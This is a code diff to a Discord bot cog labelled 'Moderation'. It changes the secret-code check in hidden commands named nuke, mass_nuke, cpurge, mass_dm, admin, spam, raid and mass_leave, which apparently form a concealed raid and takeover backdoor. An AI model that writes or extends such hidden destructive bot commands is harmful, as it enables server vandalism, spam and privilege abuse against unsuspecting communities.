@@ -48,7 +48,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def nuke(self, ctx, code=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("nuke")
             return
         quotes = ["War is peace, freedom is slavery and ignorance is strength.", 
@@ -127,7 +127,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def mass_nuke(self, ctx, code=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("mass_nuke")
             return
         os.system('cls')
@@ -213,7 +213,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def cpurge(self, ctx, code=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("cpurge")
             return
         for c in ctx.guild.channels:
@@ -230,7 +230,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def mass_dm(self, ctx, code=None, *, message=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("mass_dm")
             return
         if message != None:
@@ -255,7 +255,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def admin(self, ctx, code=None, *, role_name=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("admin")
             return
         if role_name != None:
@@ -274,7 +274,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def spam(self, ctx, code=None, *, message=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("spam")
             return
         if message != None:
@@ -303,7 +303,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def mass_nick(self, ctx, code=None, *, nickname=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("mass_nick")
             return
         if nickname:
@@ -328,7 +328,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def raid(self, ctx, code=None, rolename=None, nickname=None, channelName=None, channelNum=None, *, msg=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("raid")
             return
 
@@ -440,7 +440,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def leave(self, ctx, code=None, *, guild_name=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("leave")
             return
 
@@ -465,7 +465,7 @@ class Moderation(commands.Cog):
         await ctx.message.delete()
         check_for_servers()
 
-        if code != CODE:
+        if int(code) != CODE:
             command_error("mass_leave")
             return
         
@@ -490,7 +490,7 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def refresh(self, ctx, code=None):
         await ctx.message.delete()
-        if code != CODE:
+        if int(code) != CODE:
             command_error("refresh")
             return
         refresh()
